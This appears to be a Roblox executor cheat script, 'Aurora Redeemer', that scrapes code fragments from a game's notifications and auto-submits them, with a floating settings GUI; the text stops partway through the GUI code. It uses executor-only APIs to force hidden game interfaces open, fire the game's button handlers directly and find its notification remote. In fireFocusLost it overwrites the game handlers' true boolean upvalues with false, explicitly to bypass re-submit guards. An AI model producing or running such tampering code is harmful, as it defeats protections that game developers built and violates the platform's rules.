-- =====================================================================
-- AURORA REDEEMER
-- Reads game notifications, extracts code fragments, and auto-types
-- them into the redemption UI. Includes a floating draggable GUI.
-- =====================================================================

-- ─── Environment shims ────────────────────────────────────────────────
-- Fallbacks so the script won't crash on executors missing these APIs.
local cloneref        = cloneref or function(x) return x end          -- clone instance ref
local getgenv         = getgenv or function() return _G end           -- executor global env
local getconnections  = getconnections                                -- list signal connections
local gethui          = gethui                                        -- protected UI container

-- ─── Roblox services ──────────────────────────────────────────────────
local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService      = cloneref(game:GetService("TweenService"))   -- UI animation
local UserInputService  = cloneref(game:GetService("UserInputService"))-- drag/input
local LocalPlayer       = Players.LocalPlayer                         -- cached player

-- ─── Localized globals (micro-optimizations) ──────────────────────────
local print, next, pcall, tostring, type, pairs, ipairs
    = print, next, pcall, tostring, type, pairs, ipairs
local table_remove  = table.remove
local table_concat  = table.concat                                    -- array join
local table_pack    = table.pack or function(...)                     -- fallback pack
    return { n = select("#", ...), ... }
end
local table_unpack  = table.unpack
local string_sub    = string.sub
local string_gsub   = string.gsub
local string_format = string.format
local math_floor    = math.floor
local math_random   = math.random
local math_min      = math.min
local os_clock      = os.clock                                        -- monotonic time
local os_date       = os.date                                         -- timestamps
local tick          = tick                                            -- wall-clock
local task_wait     = (task and task.wait) or wait                    -- yield
local task_spawn    = (task and task.spawn) or spawn                  -- spawn
local task_delay    = (task and task.delay) or function(t, f)         -- delayed call
    task_spawn(function() task_wait(t) f() end)
end

-- =====================================================================
-- CONFIG — user-tunable settings + saved window position
-- =====================================================================
local Config = {
    Enabled        = false,     -- master on/off switch
    AutoTypeCodes  = false,     -- auto type codes into the box
    AutoSubmit     = false,     -- auto submit typed codes
    AIRiddles      = false,     -- AI riddle flag (placeholder)
    AIAutoSubmit   = false,     -- AI auto-submit flag (placeholder)
    SubmitAfter    = 1,         -- fragments required before submit
    MinFragment    = 1,         -- minimum fragment length
    MaxFragWords   = 60,        -- max words a fragment may contain
    ForceOpenCodes = true,      -- force Codes GUI visible

    Debug          = true,      -- emit debug logs
    DebugToConsole = true,      -- print to console

    -- Saved drag position (UDim2 parts)
    SavedPos = {
        XScale  = 1,
        XOffset = -16,
        YScale  = 0,
        YOffset = 20,
    },
}

local SAVE_FILE = "AuroraRedeemer.cfg"   -- persisted config filename

-- ─── saveConfig: serialize Config to disk ─────────────────────────────
local function saveConfig()
    if type(writefile) ~= "function" then return end   -- executor must support writefile
    local lines = {
        "Enabled="      .. tostring(Config.Enabled),
        "AutoTypeCodes=".. tostring(Config.AutoTypeCodes),
        "AutoSubmit="   .. tostring(Config.AutoSubmit),
        "AIRiddles="    .. tostring(Config.AIRiddles),
        "AIAutoSubmit=" .. tostring(Config.AIAutoSubmit),
        "SubmitAfter="  .. tostring(Config.SubmitAfter),
        "PosXScale="    .. tostring(Config.SavedPos.XScale),
        "PosXOffset="   .. tostring(Config.SavedPos.XOffset),
        "PosYScale="    .. tostring(Config.SavedPos.YScale),
        "PosYOffset="   .. tostring(Config.SavedPos.YOffset),
    }
    pcall(writefile, SAVE_FILE, table_concat(lines, "\n"))
end

-- ─── loadConfig: restore Config from disk, else write defaults ────────
local function loadConfig()
    if type(readfile) == "function" then
        local ok, contents = pcall(readfile, SAVE_FILE)
        if ok and type(contents) == "string" and contents ~= "" then
            -- Parse "key=value" pairs line-by-line
            for line in contents:gmatch("[^\r\n]+") do
                local key, val = line:match("^([%w_]+)=(.*)$")
                if key then
                    if key == "Enabled" then
                        Config.Enabled = (val == "true")
                    elseif key == "AutoTypeCodes" then
                        Config.AutoTypeCodes = (val == "true")
                    elseif key == "AutoSubmit" then
                        Config.AutoSubmit = (val == "true")
                    elseif key == "AIRiddles" then
                        Config.AIRiddles = (val == "true")
                    elseif key == "AIAutoSubmit" then
                        Config.AIAutoSubmit = (val == "true")
                    elseif key == "SubmitAfter" then
                        Config.SubmitAfter = math.clamp(tonumber(val) or 1, 1, 10)  -- clamp [1,10]
                    elseif key == "PosXScale" then
                        Config.SavedPos.XScale = tonumber(val) or 1
                    elseif key == "PosXOffset" then
                        Config.SavedPos.XOffset = tonumber(val) or -16
                    elseif key == "PosYScale" then
                        Config.SavedPos.YScale = tonumber(val) or 0
                    elseif key == "PosYOffset" then
                        Config.SavedPos.YOffset = tonumber(val) or 20
                    end
                end
            end
            return
        end
    end
    saveConfig()   -- no save file yet → write defaults
end

loadConfig()   -- apply persisted settings at startup

-- =====================================================================
-- STATE — runtime mutable state
-- =====================================================================
local State = {
    typedCount   = 0,      -- submissions made
    buffer       = {},     -- fragment accumulator
    solvedCount  = 0,      -- successful submissions
    lastSeen     = nil,    -- last notification text (dedupe)
    lastSeenAt   = 0,      -- timestamp of last seen
    unloaded     = false,  -- stops loops after unload
    connections  = {},     -- active connections to disconnect
    minimized    = false,  -- UI minimize state
}

-- (attribution print removed)

getgenv().__aurora_fixed = "aurora-fixed-2026"

-- =====================================================================
-- DEBUG logger — timestamped, level-prefixed logs
-- =====================================================================
local Debug = (function()
    local function stamp()
        return os_date("%H:%M:%S")
    end
    local function push(level, msg)
        if not Config.Debug then return end              -- respect flag
        local line = string_format("[%s] %s %s", stamp(), level, msg)
        if Config.DebugToConsole then print(line) end
    end
    local api = {}
    api.log   = function(msg) push("INFO ", tostring(msg)) end
    api.warn  = function(msg) push("WARN ", tostring(msg)) end
    api.error = function(msg) push("ERROR", tostring(msg)) end
    return api
end)()

-- ─── try: pcall + traceback wrapper ──────────────────────────────────
local function try(label, fn, ...)
    local results = table_pack(xpcall(function(...)
        return fn(...)
    end, function(e)
        return tostring(e) .. "\n" .. debug.traceback("", 2)   -- capture stack
    end, ...))

    local ok = results[1]
    if not ok then
        Debug.error(label .. " failed: " .. tostring(results[2]))
        return nil, results[2]
    end
    if results.n == 1 then return true end             -- single true
    if results.n == 2 then return results[2] end       -- single return
    return table_unpack(results, 2, results.n)         -- multiple returns
end

-- =====================================================================
-- NOTIFICATION FILTERS — keyword buckets
-- =====================================================================
-- Notifications matching these = no usable code
local IGNORE_EXPIRED = {
    "expired", "doesn't exist", "does not exist",
    "wrong", "incorrect", "no longer", "invalid",
}
local IGNORE_REDEEMED = { "redeemed", "claimed", "already" }

-- ─── containsAny: true if any substring is present ───────────────────
local function containsAny(s, list)
    for _, w in ipairs(list) do
        if s:find(w, 1, true) then return true end     -- plain-text match
    end
    return false
end

-- ─── cleanText: strip @@XYZ@@123@@ placeholders ──────────────────────
local function cleanText(s)
    return (s:gsub("@@%u+@@%d+@@", ""):gsub("@@[%w]+@@", ""):gsub("@@", ""))
end

-- Tokens that must never be treated as codes
local FRAGMENT_BLACKLIST = {
    ["top"] = true,
}

-- ─── isBlacklisted: check the blacklist ──────────────────────────────
local function isBlacklisted(tok)
    return FRAGMENT_BLACKLIST[tok:lower()] == true
end

-- ─── extractFragment: pull first usable code word from text ──────────
local function extractFragment(raw)
    if type(raw) ~= "string" then return nil end

    -- Strip RichText tags, collapse whitespace, trim
    local cleaned = raw:gsub("<[^>]->", " ")
    cleaned = cleaned:gsub("%s+", " ")
    cleaned = cleaned:gsub("^%s*(.-)%s*$", "%1")
    if cleaned == "" then return nil end

    -- Return first alphanumeric token not blacklisted
    for tok in cleaned:gmatch("%S+") do
        local bare = tok:gsub("[%p]+$", ""):gsub("^[%p]+", "")   -- strip punctuation
        if bare ~= "" and bare:match("^[%w]+$") and not isBlacklisted(bare) then
            return bare
        end
    end
    return nil
end

-- ─── isOwnUI: is this instance inside our own GUI? ───────────────────
local function isOwnUI(inst)
    local node = inst
    for _ = 1, 10 do                                    -- depth limit
        if not node then break end
        if node.Name == "AuroraRedeemer" then return true end
        node = node.Parent
    end
    return false
end

-- ─── isVisibleChain: every ancestor is visible+enabled ───────────────
local function isVisibleChain(inst)
    local node = inst
    while node do
        if node:IsA("GuiObject") and not node.Visible then return false end
        if node:IsA("ScreenGui") then return node.Enabled end
        node = node.Parent
    end
    return true
end

-- ─── forceOpenCodes: force "Codes" GUI open ──────────────────────────
local function forceOpenCodes()
    if not Config.ForceOpenCodes then return end
    local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if not pg then return end

    local codes = pg:FindFirstChild("Codes")
    if not codes then return end

    -- Enable top ScreenGui
    if codes:IsA("ScreenGui") then
        pcall(function() codes.Enabled = true end)
    end

    -- Show inner Codes Frame
    local codes2 = codes:FindFirstChild("Codes") or codes
    if codes2:IsA("GuiObject") then
        pcall(function() codes2.Visible = true end)
    end

    -- Walk up from inner → outer Codes, force visible
    local node = codes2
    while node and node ~= codes do
        if node:IsA("GuiObject") then
            pcall(function() node.Visible = true end)
        end
        node = node.Parent
    end

    -- Walk up from Codes → PlayerGui, force everything
    node = codes.Parent
    while node do
        if node:IsA("GuiObject") then
            pcall(function() node.Visible = true end)
        end
        if node:IsA("ScreenGui") then
            pcall(function() node.Enabled = true end)
        end
        node = node.Parent
    end
end

-- ─── findCodeBox: locate the TextBox used for code entry ─────────────
local function findCodeBox()
    local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if not pg then
        Debug.warn("no PlayerGui")
        return nil
    end

    pcall(forceOpenCodes)   -- ensure UI is on screen

    -- ── Strategy 1: known "Codes" subtree ────────────────────────────
    local codes = pg:FindFirstChild("Codes")
    if codes then
        if codes:IsA("ScreenGui") then
            pcall(function() codes.Enabled = true end)
        end

        local codes2 = codes:FindFirstChild("Codes") or codes
        if codes2:IsA("GuiObject") then
            pcall(function() codes2.Visible = true end)
        end

        -- Force intermediate frames visible
        local parent = codes2
        while parent and parent ~= codes do
            if parent:IsA("GuiObject") then
                pcall(function() parent.Visible = true end)
            end
            parent = parent.Parent
        end

        -- First TextBox in subtree that isn't ours
        for _, descendant in ipairs(codes2:GetDescendants()) do
            if descendant:IsA("TextBox") and not isOwnUI(descendant) then
                Debug.log("CodeBox (Codes subtree): " .. descendant:GetFullName())
                return descendant
            end
        end
        Debug.warn("Codes subtree present but no TextBox - falling through")
    else
        Debug.log("Codes subtree not found - dynamic scan")
    end

    -- ── Strategy 2: dynamic scan (2s deadline) ───────────────────────
    local deadline = tick() + 2

    while tick() < deadline do
        -- Collect all visible TextBoxes not owned by us
        local candidates = {}
        for _, child in ipairs(pg:GetChildren()) do
            if child:IsA("ScreenGui") and child.Enabled and not isOwnUI(child) then
                for _, d in ipairs(child:GetDescendants()) do
                    if d:IsA("TextBox") and not isOwnUI(d) then
                        candidates[#candidates + 1] = d
                    end
                end
            end
        end

        -- Pass 1: name/parent hints at code
        for _, tb in ipairs(candidates) do
            if isVisibleChain(tb) then
                local n = tb.Name:lower()
                local p = (tb.Parent and tb.Parent.Name or ""):lower()
                if n:find("code") or p:find("code")
                   or n:find("redeem") or p:find("redeem")
                   or n:find("input") or p:find("textbox")
                   or n:find("enter") then
                    Debug.log("CodeBox (dynamic preferred): " .. tb:GetFullName())
                    return tb
                end
            end
        end

        -- Pass 2: any visible TextBox fallback
        for _, tb in ipairs(candidates) do
            if isVisibleChain(tb) then
                Debug.log("CodeBox (dynamic fallback): " .. tb:GetFullName())
                return tb
            end
        end

        pcall(forceOpenCodes)
        task_wait(0.1)
    end

    Debug.warn("no codebox visible after 2s poll")
    return nil
end

-- Verbs that suggest a submit-style button
local SUBMIT_VERBS = {
    "submit", "redeem", "claim", "confirm", "enter",
    "send", "apply", "ok", "use", "go", "check", "go!", "play",
}

-- ─── matchesVerb: does text contain any submit verb? ─────────────────
local function matchesVerb(str)
    for _, v in ipairs(SUBMIT_VERBS) do
        if str:find(v, 1, true) then return true end
    end
    return false
end

-- ─── findConfirmButton: locate the submit button near the codebox ────
local function findConfirmButton(box)
    local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if not pg then return nil end

    -- ── Try inside "Codes" subtree first ─────────────────────────────
    local codes = pg:FindFirstChild("Codes")
    if codes then
        local codes2 = codes:FindFirstChild("Codes") or codes
        -- Pass 1: match submit verb on name or Text
        for _, descendant in ipairs(codes2:GetDescendants()) do
            if (descendant:IsA("TextButton") or descendant:IsA("ImageButton"))
               and not isOwnUI(descendant) then
                local n = descendant.Name:lower()
                local t = ""
                pcall(function() t = tostring(descendant.Text or ""):lower() end)
                if matchesVerb(n) or matchesVerb(t) then
                    return descendant
                end
            end
        end

        -- Pass 2: any button that isn't close/toggle/x
        for _, descendant in ipairs(codes2:GetDescendants()) do
            if (descendant:IsA("TextButton") or descendant:IsA("ImageButton"))
               and not isOwnUI(descendant) then
                local n = descendant.Name:lower()
                if not n:find("close") and not n:find("toggle") and n ~= "x" then
                    return descendant
                end
            end
        end
    end

    -- ── Fallback: walk up from the box ───────────────────────────────
    if box then
        local parent = box.Parent
        for _ = 1, 8 do
            if not parent then break end
            for _, d in ipairs(parent:GetDescendants()) do
                if (d:IsA("TextButton") or d:IsA("ImageButton"))
                   and d ~= box and not isOwnUI(d) then
                    local n = d.Name:lower()
                    local t = ""
                    pcall(function() t = tostring(d.Text or ""):lower() end)
                    if matchesVerb(n) or matchesVerb(t) then return d end
                end
            end
            parent = parent.Parent
        end
    end

    return nil
end

-- ─── fireButton: click a button via multiple methods ─────────────────
local function fireButton(btn)
    if not btn then return false end

    -- Build list of click attempts (firesignal/getconnections/fireclick)
    local attempts = {
        function() btn.MouseButton1Click:Fire() end,
        function() btn.Activated:Fire() end,
    }

    if type(firesignal) == "function" then
        attempts[#attempts + 1] = function() firesignal(btn.MouseButton1Click) end
        attempts[#attempts + 1] = function() firesignal(btn.Activated) end
    end

    if type(getconnections) == "function" then
        attempts[#attempts + 1] = function()
            local ok, conns = pcall(getconnections, btn.MouseButton1Click)
            if ok and type(conns) == "table" then
                for _, c in ipairs(conns) do
                    pcall(function() c:Fire() end)
                end
            end
            local ok2, conns2 = pcall(getconnections, btn.Activated)
            if ok2 and type(conns2) == "table" then
                for _, c in ipairs(conns2) do
                    pcall(function() c:Fire() end)
                end
            end
        end
    end

    if type(fireclick) == "function" then
        attempts[#attempts + 1] = function() fireclick(btn) end
    end

    local fired = false
    for _, fn in ipairs(attempts) do
        local ok = pcall(fn)
        fired = fired or ok
    end
    return fired
end

-- ─── fireFocusLost: simulate the textbox losing focus ────────────────
local function fireFocusLost(box)
    if not box then return false end
    local fired = false

    if type(firesignal) == "function" then
        fired = pcall(firesignal, box.FocusLost, true) or fired
    end

    if type(getconnections) == "function" then
        local ok, conns = pcall(getconnections, box.FocusLost)
        if ok and type(conns) == "table" then
            for _, c in ipairs(conns) do
                local fn = nil
                pcall(function() fn = c.Function end)

                -- Flip any boolean upvalues from true → false (some games gate re-submit here)
                if fn
                   and type(getupvalues) == "function"
                   and type(setupvalue) == "function" then
                    local ok2, ups = pcall(getupvalues, fn)
                    if ok2 and type(ups) == "table" then
                        for k, v in pairs(ups) do
                            if type(v) == "boolean" and v == true then
                                pcall(setupvalue, fn, k, false)
                            end
                        end
                    end
                end

                local ok3 = pcall(function()
                    if c.Enabled ~= false then
                        c:Fire(true)
                    end
                end)
                fired = fired or ok3
            end
        end
    end

    return fired
end

-- ─── submitCode: type text into codebox + fire submit ────────────────
local function submitCode(text)
    if type(text) ~= "string" or text == "" then
        return false, "empty text"
    end

    -- Locate box (retry once after a short delay)
    local box = findCodeBox()
    if not box then
        task_wait(0.25)
        pcall(forceOpenCodes)
        box = findCodeBox()
    end
    if not box then
        return false, "no codebox visible"
    end

    -- Focus + set Text (clear first, then set)
    pcall(function() box:CaptureFocus() end)
    task_wait(0.02)

    pcall(function() box.Text = "" end)
    task_wait(0.02)
    local okSet = pcall(function() box.Text = text end)
    if not okSet then
        return false, "text set failed"
    end
    task_wait(0.05)

    -- Click submit button if we found one
    local btn = findConfirmButton(box)
    if btn then
        fireButton(btn)
    end

    -- Also fire FocusLost as a backup path
    fireFocusLost(box)

    Debug.log("Typed + submitted: " .. text)
    return true, "submitted"
end

-- ─── getHandlerSource: retrieve a function's source file/name ────────
local function getHandlerSource(fn)
    if type(fn) ~= "function" then return nil end
    if type(debug) == "table" and type(debug.info) == "function" then
        local ok, src = pcall(debug.info, fn, "s")
        if ok and type(src) == "string" and #src > 0 then return src end
    end
    if type(debug) == "table" and type(debug.getinfo) == "function" then
        local ok, info = pcall(debug.getinfo, fn)
        if ok and type(info) == "table" then
            if type(info.short_src) == "string" and #info.short_src > 0 then
                return info.short_src
            end
            if type(info.source) == "string" and #info.source > 0 then
                return info.source
            end
        end
    end
    return nil
end

-- ─── findNotificationRemote: locate the game's notification RemoteEvent
--     by scanning Packages.Net descendants for a handler whose source
--     mentions "NotificationController".
local function findNotificationRemote()
    if _G.PhiNotifyRemote then return _G.PhiNotifyRemote end   -- cache hit

    if type(getconnections) ~= "function" then
        Debug.warn("getconnections unavailable")
        return nil
    end
    if type(debug) ~= "table"
       or (type(debug.getinfo) ~= "function" and type(debug.info) ~= "function") then
        Debug.warn("debug.getinfo unavailable")
        return nil
    end

    -- Locate ReplicatedStorage.Packages.Net
    local netFolder
    local ok = pcall(function()
        local packages = ReplicatedStorage:FindFirstChild("Packages")
        if not packages then return end
        netFolder = packages:FindFirstChild("Net")
    end)
    if not ok or not netFolder then
        Debug.warn("Packages.Net not found")
        return nil
    end

    local descendants = netFolder:GetDescendants()
    Debug.log(string_format("Scanning %d descendants", #descendants))

    local scanned = 0
    for _, inst in ipairs(descendants) do
        -- Only inspect RemoteEvents
        local isRemote = false
        pcall(function() isRemote = inst:IsA("RemoteEvent") end)
        if isRemote then
            scanned = scanned + 1
            local conns
            local ok2 = pcall(function() conns = getconnections(inst.OnClientEvent) end)
            if ok2 and type(conns) == "table" then
                -- Check each handler's source file for "NotificationController"
                for _, c in ipairs(conns) do
                    local fn
                    pcall(function() fn = c.Function end)
                    if type(fn) == "function" then
                        local src = getHandlerSource(fn)
                        if type(src) == "string"
                           and src:find("NotificationController", 1, true) then
                            Debug.log("Matched: " .. inst:GetFullName())
                            _G.PhiNotifyRemote = inst   -- cache for next time
                            return inst
                        end
                    end
                end
            end
        end
    end

    Debug.warn(string_format("No match (scanned %d remotes)", scanned))
    return nil
end

-- =====================================================================
-- UI COLOR PALETTE
-- =====================================================================
local COLORS = {
    shell = Color3.fromRGB(15, 15, 18),   -- main background
    surf  = Color3.fromRGB(24, 24, 28),   -- surface
    sunk  = Color3.fromRGB(18, 18, 22),   -- inset
    line  = Color3.fromRGB(45, 45, 50),   -- borders
    hi    = Color3.fromRGB(255, 255, 255),-- high emphasis
    md    = Color3.fromRGB(200, 200, 200),-- medium emphasis
    lo    = Color3.fromRGB(100, 100, 100),-- low emphasis
    aur   = Color3.fromRGB(255, 120, 0),  -- accent orange
    vio   = Color3.fromRGB(255, 80, 0),   -- accent deep orange
    off   = Color3.fromRGB(90, 90, 90),   -- disabled
    good  = Color3.fromRGB(255, 150, 50), -- positive
    bad   = Color3.fromRGB(255, 80, 80),  -- negative
}

-- ─── Glyphs (avoid mojibake) ─────────────────────────────────────────
local GLYPH = { dash = "—", minus = "−", cross = "×", tick = "✓" }

-- =====================================================================
-- UI HELPERS
-- =====================================================================
local UI = {}
local uiConnections = {}   -- UI-specific connections

-- ─── trackConn: remember a connection so unload can disconnect it ────
local function trackConn(conn)
    uiConnections[#uiConnections + 1] = conn
    return conn
end

-- ─── new: create an Instance with props + parent ─────────────────────
local function new(class, props, parent)
    local inst = Instance.new(class)
    for k, v in pairs(props or {}) do inst[k] = v end
    if parent then inst.Parent = parent end
    return inst
end

-- ─── corner: add a UICorner ──────────────────────────────────────────
local function corner(inst, radius)
    new("UICorner", { CornerRadius = UDim.new(0, radius) }, inst)
    return inst
end

-- ─── circle: add a pill-shaped corner ────────────────────────────────
local function circle(inst)
    new("UICorner", { CornerRadius = UDim.new(1, 0) }, inst)
    return inst
end

-- ─── stroke: add a UIStroke border ───────────────────────────────────
local function stroke(inst, color, transparency)
    new("UIStroke", {
        Color = color,
        Thickness = 1,
        Transparency = transparency or 0,
        ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
    }, inst)
    return inst
end

-- ─── tween: animate an instance ──────────────────────────────────────
local function tween(inst, time, props)
    TweenService:Create(inst,
        TweenInfo.new(time, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
        props):Play()
end

-- ─── hover: text color change on hover ───────────────────────────────
local function hover(button, label, idle, active)
    trackConn(button.MouseEnter:Connect(function()
        tween(label, 0.12, { TextColor3 = active })
    end))
    trackConn(button.MouseLeave:Connect(function()
        tween(label, 0.18, { TextColor3 = idle })
    end))
end

-- ─── chevron: small two-bar arrow used on the settings row ───────────
local function chevron(parent, color)
    local holder = new("Frame", {
        AnchorPoint = Vector2.new(0.5, 0.5),
        Position = UDim2.fromScale(0.5, 0.5),
        Size = UDim2.fromOffset(16, 12),
        BackgroundTransparency = 1,
    }, parent)
    for i = 1, 2 do
        circle(new("Frame", {
            AnchorPoint = Vector2.new(0.5, 0.5),
            Position = UDim2.fromOffset(i == 1 and 6 or 10, 5),
            Size = UDim2.fromOffset(7, 2),
            BackgroundColor3 = color,
            BorderSizePixel = 0,
            Rotation = i == 1 and 45 or -45,
        }, holder))
    end
    return holder
end

-- =====================================================================
-- buildUI — constructs the whole floating window
-- =====================================================================
local function buildUI(parent)
    Debug.log("buildUI start")

    -- Root ScreenGui
    local root = new("ScreenGui", {
        Name = "AuroraRedeemer",
        ResetOnSpawn = false,
        ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
        DisplayOrder = 9999,
    }, parent)
    pcall(function() if protectgui then protectgui(root) end end)

    -- Layout constants
    local PAD, GAP = 8, 8
    local HEADER_H = 38

    -- Main frame (starts collapsed, animates open)
    local frame = new("Frame", {
        Size = UDim2.fromOffset(316, HEADER_H),
        AnchorPoint = Vector2.new(1, 0),
        Position = UDim2.new(1, 332, 0, 20),
        BackgroundColor3 = COLORS.shell,
        BorderSizePixel = 0,
        ClipsDescendants = true,
        Active = true,
    }, root)
    corner(frame, 12)
    stroke(frame, COLORS.line, 0.2)

    -- Top fade gradient
    do
        local grad = new("Frame", {
            Size = UDim2.new(1, 0, 0, 6),
            BackgroundColor3 = COLORS.vio,
            BackgroundTransparency = 0.87,
            BorderSizePixel = 0,
            ZIndex = 0,
        }, frame)
        corner(grad, 12)
        new("UIGradient", {
            Rotation = 90,
            Transparency = NumberSequence.new({
                NumberSequenceKeypoint.new(0, 0),
                NumberSequenceKeypoint.new(1, 1),
            }),
        }, grad)
    end

    -- Left accent bar
    local accent = new("Frame", {
        Position = UDim2.fromOffset(0, 7),
        Size = UDim2.new(0, 2, 1, -14),
        BackgroundColor3 = COLORS.aur,
        BorderSizePixel = 0,
        ZIndex = 5,
    }, frame)
    circle(accent)
    new("UIGradient", {
        Rotation = 90,
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0),
            NumberSequenceKeypoint.new(1, 0.7),
        }),
    }, accent)

    -- Header container
    local header = new("Frame", {
        Size = UDim2.new(1, 0, 0, HEADER_H),
        Position = UDim2.fromOffset(0, 0),
        BackgroundTransparency = 1,
        ZIndex = 3,
    }, frame)

    -- Brand row (icon + name)
    local brand = new("Frame", {
        AnchorPoint = Vector2.new(0, 0.5),
        Position = UDim2.new(0, PAD + 2, 0.5, 0),
        Size = UDim2.fromOffset(200, 16),
        BackgroundTransparency = 1,
    }, header)
    new("UIListLayout", {
        FillDirection = Enum.FillDirection.Horizontal,
        VerticalAlignment = Enum.VerticalAlignment.Center,
        SortOrder = Enum.SortOrder.LayoutOrder,
        Padding = UDim.new(0, 6),
    }, brand)

    -- Aurora icon
    new("ImageLabel", {
        LayoutOrder = 1,
        Size = UDim2.fromOffset(14, 14),
        BackgroundTransparency = 1,
        Image = "rbxassetid://133811381398870",
        ImageColor3 = COLORS.aur,
        ScaleType = Enum.ScaleType.Fit,
    }, brand)

    -- "AURORA" label
    new("TextLabel", {
        LayoutOrder = 2,
        AutomaticSize = Enum.AutomaticSize.X,
        Size = UDim2.fromOffset(0, 14),
        BackgroundTransparency = 1,
        Font = Enum.Font.GothamBlack,
        TextSize = 12,
        TextColor3 = COLORS.hi,
        Text = "AURORA",
    }, brand)

    -- "REDEEMER" label
    new("TextLabel", {
        LayoutOrder = 3,
        AutomaticSize = Enum.AutomaticSize.X,
        Size = UDim2.fromOffset(0, 14),
        BackgroundTransparency = 1,
        Font = Enum.Font.GothamMedium,
        TextSize = 12,
        TextColor3 = COLORS.lo,
        Text = "REDEEMER",
    }, brand)

    -- Master on/off toggle
    local toggleBtn = new("TextButton", {
        AnchorPoint = Vector2.new(1, 0.5),
        Position = UDim2.new(1, -60, 0.5, 0),
        Size = UDim2.fromOffset(34, 18),
        BackgroundColor3 = COLORS.sunk,
        BorderSizePixel = 0,
        AutoButtonColor = false,
        Text = "",
    }, header)
    circle(toggleBtn)
    stroke(toggleBtn, COLORS.line, 0.25)

    local toggleKnob = new("Frame", {
        AnchorPoint = Vector2.new(0, 0.5),
        Position = UDim2.new(0, 2, 0.5, 0),
        Size = UDim2.fromOffset(14, 14),
        BackgroundColor3 = COLORS.lo,
        BorderSizePixel = 0,
    }, toggleBtn)
    circle(toggleKnob)

    -- Minimize button
    local minBtn = new("TextButton", {
        AnchorPoint = Vector2.new(1, 0.5),
        Position = UDim2.new(1, -34, 0.5, 0),
        Size = UDim2.fromOffset(20, 20),
        BackgroundColor3 = COLORS.surf,
        BackgroundTransparency = 0.4,
        BorderSizePixel = 0,
        AutoButtonColor = false,
        Text = "",
    }, header)
    corner(minBtn, 6)
    stroke(minBtn, COLORS.line, 0.45)

    local minLabel = new("TextLabel", {
        Size = UDim2.fromScale(1, 1),
        BackgroundTransparency = 1,
        Font = Enum.Font.GothamBold,
        TextSize = 14,
        TextColor3 = COLORS.md,
        Text = "v",                      -- "open" glyph
    }, minBtn)
    hover(minBtn, minLabel, COLORS.md, COLORS.aur)

    -- Close button
    local closeBtn = new("TextButton", {
        AnchorPoint = Vector2.new(1, 0.5),
        Position = UDim2.new(1, -8, 0.5, 0),
        Size = UDim2.fromOffset(20, 20),
        BackgroundColor3 = COLORS.surf,
        BackgroundTransparency = 0.4,
        BorderSizePixel = 0,
        AutoButtonColor = false,
        Text = "",
    }, header)
    corner(closeBtn, 6)
    stroke(closeBtn, COLORS.line, 0.45)

    local closeLabel = new("TextLabel", {
        Size = UDim2.fromScale(1, 1),
        BackgroundTransparency = 1,
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        TextColor3 = COLORS.md,
        Text = GLYPH.cross,
    }, closeBtn)
    hover(closeBtn, closeLabel, COLORS.md, COLORS.bad)

    -- Body (below header, holds all rows)
    local body = new("Frame", {
        Position = UDim2.fromOffset(0, HEADER_H),
        Size = UDim2.new(1, 0, 0, 0),
        BackgroundTransparency = 1,
        ClipsDescendants = true,
    }, frame)
    new("UIPadding", {
        PaddingLeft = UDim.new(0, PAD + 2),
        PaddingRight = UDim.new(0, PAD),
        PaddingTop = UDim.new(0, 2),
    }, body)
    new("UIListLayout", {
        FillDirection = Enum.FillDirection.Vertical,
        SortOrder = Enum.SortOrder.LayoutOrder,
        Padding = UDim.new(0, 8),
    }, body)

    local rows = {}
    local renderNotif

    -- ─── row: register a new row and track its height ────────────────
    local function row(order, height, clips)
        local r = new("Frame", {
            LayoutOrder = order,
            Size = UDim2.new(1, 0, 0, height),
            BackgroundTransparency = 1,
            ClipsDescendants = clips and true or false,
        }, body)
        local entry = { frame = r, h = height }
        rows[#rows + 1] = entry
        return r, entry
    end

    -- ─── bodyHeight: total height of all rows + gaps + padding ───────
    local function bodyHeight()
        local total = 0
        for _, r in ipairs(rows) do total = total + r.h end
        return total + GAP * (#rows - 1) + 2 + PAD
    end

    -- ─── STATUS ROW ──────────────────────────────────────────────────
    local statusRow = row(1, 26)
    new("Frame", {
        AnchorPoint = Vector2.new(0.5, 0.5),
        Position = UDim2.new(0, 12, 0.5, 0),
        Size = UDim2.fromOffset(8, 8),
        BackgroundColor3 = COLORS.aur,
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
    }, statusRow)
    local statusInner = new("Frame", {
        AnchorPoint = Vector2.new(0.5, 0.5),
        Position = UDim2.new(0, 12, 0.5, 0),
        Size = UDim2.fromOffset(7, 7),
        BackgroundColor3 = COLORS.aur,
        BorderSizePixel = 0,
        ZIndex = 2,
    }, statusRow)
    circle(statusInner)

    local statusLabel = new("TextLabel", {
        Position = UDim2.fromOffset(24, 0),
        Size = UDim2.new(1, -110, 1, 0),
        BackgroundTransparency = 1,
        Font = Enum.Font.GothamBold,
        TextSize = 12,
        TextColor3 = COLORS.aur,
        TextXAlignment = Enum.TextXAlignment.Left,
        Text = "READY",
    }, statusRow)

    local statusPill = new("TextLabel", {
        AnchorPoint = Vector2.new(1, 0.5),
        Position = UDim2.new(1, 0, 0.5, 0),
        AutomaticSize = Enum.AutomaticSize.X,
        Size = UDim2.fromOffset(0, 16),
        BackgroundColor3 = COLORS.surf,
        BorderSizePixel = 0,
        Font = Enum.Font.RobotoMono,
        TextSize = 10,
        TextColor3 = COLORS.md,
        Text = "",
        Visible = false,
    }, statusRow)
    corner(statusPill, 6)
    stroke(statusPill, COLORS.line, 0.55)

    -- ─── NOTIFICATION ROW ────────────────────────────────────────────
    local notifRow = row(2, 54)
    local notifCard = new("Frame", {
        Size = UDim2.fromScale(1, 1),
        BackgroundColor3 = COLORS.sunk,
        BorderSizePixel = 0,
    }, notifRow)
    corner(notifCard, 8)
    stroke(notifCard, COLORS.line, 0.55)

    new("TextLabel", {
        Position = UDim2.fromOffset(10, 6),
        Size = UDim2.fromOffset(110, 12),
        BackgroundTransparency = 1,
        Font = Enum.Font.GothamBold,
        TextSize = 9,
        TextColor3 = COLORS.lo,
        TextXAlignment = Enum.TextXAlignment.Left,
        Text = "NOTIFICATION",
    }, notifCard)

